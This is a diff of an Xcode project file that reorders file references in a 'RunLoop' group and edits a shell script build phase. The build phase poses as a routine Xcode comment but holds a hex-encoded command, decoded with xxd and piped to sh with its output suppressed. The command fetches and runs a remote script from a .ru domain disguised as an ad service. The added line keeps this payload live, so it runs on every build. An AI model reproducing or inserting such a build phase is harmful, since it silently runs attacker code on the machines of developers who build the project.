@@ -713,15 +713,15 @@
 		E0C46BA727FADEB000CBD90C /* RunLoop */ = {
 			isa = PBXGroup;
 			children = (
-				E0C46BA827FADEB000CBD90C /* ZWWObserverViewController.h */,
-				E0C46BA927FADEB000CBD90C /* ZWWUseRunloopViewController.h */,
+				E0C46BAC27FADEB000CBD90C /* ZWWTimerViewController.h */,
+				E0C46BB027FADEB000CBD90C /* ZWWTimerViewController.m */,
 				E0C46BAA27FADEB000CBD90C /* ZWWTimerViewController.xib */,
 				E0C46BAB27FADEB000CBD90C /* ZWWThread.h */,
-				E0C46BAC27FADEB000CBD90C /* ZWWTimerViewController.h */,
 				E0C46BAD27FADEB000CBD90C /* ZWWThread.m */,
+				E0C46BA827FADEB000CBD90C /* ZWWObserverViewController.h */,
 				E0C46BAE27FADEB000CBD90C /* ZWWUseRunloopViewController.m */,
+				E0C46BA927FADEB000CBD90C /* ZWWUseRunloopViewController.h */,
 				E0C46BAF27FADEB000CBD90C /* ZWWObserverViewController.m */,
-				E0C46BB027FADEB000CBD90C /* ZWWTimerViewController.m */,
 				E0C46BB127FADEB000CBD90C /* ZWWUseRunloopViewController.xib */,
 			);
 			path = RunLoop;
@@ -969,7 +969,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f\r\\c7961686f6f6164732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f\n\\c7961686f6f6164732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
